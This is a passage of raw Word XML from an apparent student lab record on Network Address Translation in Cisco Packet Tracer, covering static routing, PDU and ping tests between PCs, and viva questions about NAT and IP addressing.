          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="62BD467B" wp14:editId="1245BDDF">
            <wp:extent cx="5731510" cy="1218660"/>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2"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5731510" cy="1218660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B724AE3" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4323A580" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59195785" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66D186F1" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AF8DF02" w14:textId="3C3F634E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Static Routing on Router2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ED8A6D9" w14:textId="1335E587" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open Router2 → Config tab → Static.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CDC0188" w14:textId="15B31E53" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Fill the fields: Network,Subnet Mask,Next Hop</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78C08BCE" w14:textId="139F050F" w:rsidR="00AB6281" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Click Add </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="295746A0" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00A11CBB">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0213A6F5" w14:textId="0DC067B5" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1891C325" wp14:editId="2AF81F96">
            <wp:extent cx="4117726" cy="3648216"/>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3"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4117726" cy="3648216"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08194BF5" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="46F8B329" w14:textId="143D20A0" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>4.Test Connectivity Using PDU and Ping</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DFE018A" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>PDU Test:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD61331" w14:textId="7E58B902" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Select the Add Simple PDU tool from the main toolbar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9238E2" w14:textId="2CBE775E" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Source: PC3 → Destination: PC2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A31D4E" w14:textId="21F60B85" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Send the PDU.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="248DED37" w14:textId="7724B3E5" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="34"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>The PDU suceeds because the private IP can traverse the public network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D227E6" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0BE0795D" wp14:editId="3D9C9D48">
            <wp:extent cx="5379841" cy="741392"/>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4"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5379841" cy="741392"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="67FCC2DF" w14:textId="3C8ED0AB" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Select the Add Simple PDU tool from the main toolbar.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B407AA5" w14:textId="4DE8083C" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Source: PC2 → Destination: PC3.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54AAB4EB" w14:textId="5990D703" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Send the PDU.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7804BA" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00A11CBB">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="67C8D109" w14:textId="56B862B2" w:rsidR="00AB6281" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>The PDU fails  because the public IP cannot traverse the private network.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DBB2AAF" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C0BD771" w14:textId="1E08413B" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00AB6281">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3C4AAB59" wp14:editId="179C4728">
            <wp:extent cx="5211894" cy="812573"/>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5"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5211894" cy="812573"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D54F51F" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ping test:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E4235C5" w14:textId="4CD1A281" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open command prompt in PC3 and ping PC2.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4C95C1" w14:textId="21541751" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ping successful.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4819F1BE" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="61628A7E" wp14:editId="1C67F01F">
            <wp:extent cx="5170596" cy="3521081"/>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6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5170596" cy="3521081"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="759403B6" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="120DC394" w14:textId="2CD8E52C" w:rsidR="00AB6281" w:rsidRPr="00A11CBB" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Open command terminal in PC2 and ping PC3.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="265BDDB1" w14:textId="17DC890D" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00A11CBB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="37"/>
        </w:numPr>
        <w:spacing w:before="198" w:after="0" w:line="360" w:lineRule="auto"/>
      </w:pPr>
      <w:r w:rsidRPr="00A11CBB">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Ping Failed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D5496B5" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="21267B91" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A73A1C3" wp14:editId="2111A124">
            <wp:extent cx="4217441" cy="464869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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4217441" cy="4648698"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D9AC8E" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F531B86" w14:textId="77777777" w:rsidR="00AB6281" w:rsidRDefault="00AB6281" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C5F2D09" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Result</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A4F976C" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Thus Network Address Translation (NAT) was examined using Cisco Packet Tracer.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A70EC50" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="75B3437E" w14:textId="77777777" w:rsidR="00812B48" w:rsidRDefault="00812B48" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F746185" w14:textId="1CC3CC6A" w:rsidR="00812B48" w:rsidRPr="00812B48" w:rsidRDefault="00812B48" w:rsidP="00812B48">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Viva Questions :</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0926B05A" w14:textId="44D3355E" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>1. What is Network Address Translation (NAT)?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C4826C4" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:Network Address Translation (NAT) is a technique that converts private IP addresses into public IP addresses, allowing devices in a local network to communicate with the Internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6703FE46" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>2. Why is NAT used in computer networks?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F3EB1CD" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:NAT is used to conserve public IP addresses and provide an additional layer of security by hiding internal network addresses from external networks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4337CE4E" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>3. What is the difference between a private IP address and a public IP address?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF24F17" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
        <w:spacing w:before="198" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:t>Answer:A private IP address is used within a local network and cannot be accessed directly from the Internet, while a public IP address is globally unique and used for Internet communication.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40D10D82" w14:textId="77777777" w:rsidR="0094061E" w:rsidRDefault="00000000" w:rsidP="00303157">
      <w:pPr>
